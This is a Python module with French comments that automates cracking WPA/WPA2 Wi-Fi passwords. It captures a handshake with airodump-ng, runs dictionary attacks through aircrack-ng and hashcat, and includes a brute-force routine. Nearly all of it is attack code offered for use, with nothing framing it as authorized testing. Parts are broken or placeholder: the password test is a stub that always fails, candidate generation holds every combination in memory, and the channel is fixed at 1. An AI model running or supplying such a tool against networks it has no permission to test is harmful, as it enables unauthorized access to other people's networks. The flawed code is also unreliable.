#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module WPA/WPA2 Cracking
Attaques par dictionnaire et force brute
"""

import os
import time
import subprocess
import threading
from datetime import datetime

class WPACracker:
    """Classe pour le cracking WPA/WPA2"""
    
    def __init__(self, logger):
        self.logger = logger
        self.running = False
        self.crack_thread = None
        self.wordlists = self.get_wordlists()
        
    def get_wordlists(self):
        """Récupère les wordlists disponibles"""
        wordlists = []
        common_paths = [
            '/usr/share/wordlists/',
            '/usr/share/dict/',
            '/opt/wordlists/',
            '/home/kali/wordlists/'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.txt') or file.endswith('.lst'):
                        wordlists.append(os.path.join(path, file))
        
        return wordlists
    
    def capture_handshake(self, bssid, interface, output_file):
        """Capture un handshake WPA"""
        try:
            self.logger.log("INFO", f"Capture du handshake pour {bssid}")
            
            # Démarrage d'airodump-ng pour capturer le handshake
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', '1',
                '--write', output_file,
                '--output-format', 'cap',
                interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Attente de la capture
            time.sleep(30)
            process.terminate()
            process.wait()
            
            # Vérification de la capture
            if os.path.exists(f"{output_file}-01.cap"):
                self.logger.log("INFO", "Handshake capturé avec succès")
                return True
            else:
                self.logger.log("ERROR", "Échec de la capture du handshake")
                return False
                
        except Exception as e:
            self.logger.log("ERROR", f"Erreur capture handshake: {str(e)}")
            return False
    
    def crack_with_aircrack(self, cap_file, wordlist):
        """Crack avec aircrack-ng"""
        try:
            self.logger.log("INFO", f"Démarrage du cracking avec {wordlist}")
            
            cmd = [
                'aircrack-ng',
                cap_file,
                '-w', wordlist,
                '--output-format', '1'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Surveillance du processus
            while process.poll() is None:
                if not self.running:
                    process.terminate()
                    break
                time.sleep(1)
            
            stdout, stderr = process.communicate()
            
            if "KEY FOUND!" in stdout:
                # Extraction du mot de passe
                lines = stdout.split('\n')
                for line in lines:
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0]
                        self.logger.log("SUCCESS", f"Mot de passe trouvé: {password}")
                        return password
            
            self.logger.log("INFO", "Mot de passe non trouvé avec cette wordlist")
            return None
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur cracking: {str(e)}")
            return None
    
    def crack_with_hashcat(self, cap_file, wordlist):
        """Crack avec hashcat (GPU)"""
        try:
            self.logger.log("INFO", f"Démarrage du cracking GPU avec {wordlist}")
            
            # Conversion en format hashcat
            hccapx_file = cap_file.replace('.cap', '.hccapx')
            
            # Conversion avec cap2hccapx
            convert_cmd = ['cap2hccapx', cap_file, hccapx_file]
            subprocess.run(convert_cmd, capture_output=True)
            
            if not os.path.exists(hccapx_file):
                self.logger.log("ERROR", "Échec de la conversion pour hashcat")
                return None
            
            # Cracking avec hashcat
            cmd = [
                'hashcat',
                '-m', '2500',  # Mode WPA/WPA2
                '-a', '0',      # Mode dictionnaire
                hccapx_file,
                wordlist,
                '--potfile-disable',
                '--status',
                '--status-timer', '10'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Surveillance du processus
            while process.poll() is None:
                if not self.running:
                    process.terminate()
                    break
                time.sleep(1)
            
            stdout, stderr = process.communicate()
            
            # Vérification du résultat
            if "Status" in stdout and "Recovered" in stdout:
                # Extraction du mot de passe
                for line in stdout.split('\n'):
                    if "Recovered" in line and "1/1" in line:
                        password = line.split(':')[-1].strip()
                        self.logger.log("SUCCESS", f"Mot de passe GPU trouvé: {password}")
                        return password
            
            self.logger.log("INFO", "Mot de passe non trouvé avec GPU")
            return None
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur cracking GPU: {str(e)}")
            return None
    
    def brute_force_attack(self, bssid, charset, min_length, max_length):
        """Attaque par force brute"""
        try:
            self.logger.log("INFO", f"Force brute: {charset}, {min_length}-{max_length} caractères")
            
            # Génération des mots de passe
            passwords = self.generate_passwords(charset, min_length, max_length)
            
            # Test des mots de passe
            for password in passwords:
                if not self.running:
                    break
                
                # Test de connexion (simulation)
                if self.test_password(bssid, password):
                    self.logger.log("SUCCESS", f"Mot de passe trouvé: {password}")
                    return password
            
            self.logger.log("INFO", "Aucun mot de passe trouvé par force brute")
            return None
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur force brute: {str(e)}")
            return None
    
    def generate_passwords(self, charset, min_length, max_length):
        """Génère des mots de passe"""
        import itertools
        
        passwords = []
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                if not self.running:
                    break
                passwords.append(''.join(combo))
        
        return passwords
    
    def test_password(self, bssid, password):
        """Teste un mot de passe (simulation)"""
        # Simulation - dans un vrai environnement, on testerait la connexion
        return False
    
    def start_cracking(self, bssid, interface, method='dictionary', wordlist=None, 
                      charset='abcdefghijklmnopqrstuvwxyz0123456789', 
                      min_length=6, max_length=8):
        """Démarre le processus de cracking"""
        self.running = True
        
        # Capture du handshake
        cap_file = f"/tmp/handshake_{bssid.replace(':', '')}"
        if not self.capture_handshake(bssid, interface, cap_file):
            return None
        
        cap_file = f"{cap_file}-01.cap"
        
        if method == 'dictionary':
            # Cracking par dictionnaire
            if not wordlist:
                wordlist = self.wordlists[0] if self.wordlists else None
            
            if wordlist:
                # Essai avec aircrack-ng
                password = self.crack_with_aircrack(cap_file, wordlist)
                if password:
                    return password
                
                # Essai avec hashcat
                password = self.crack_with_hashcat(cap_file, wordlist)
                if password:
                    return password
        
        elif method == 'brute_force':
            # Force brute
            password = self.brute_force_attack(bssid, charset, min_length, max_length)
            if password:
                return password
        
        return None
    
    def stop_cracking(self):
        """Arrête le processus de cracking"""
        self.running = False 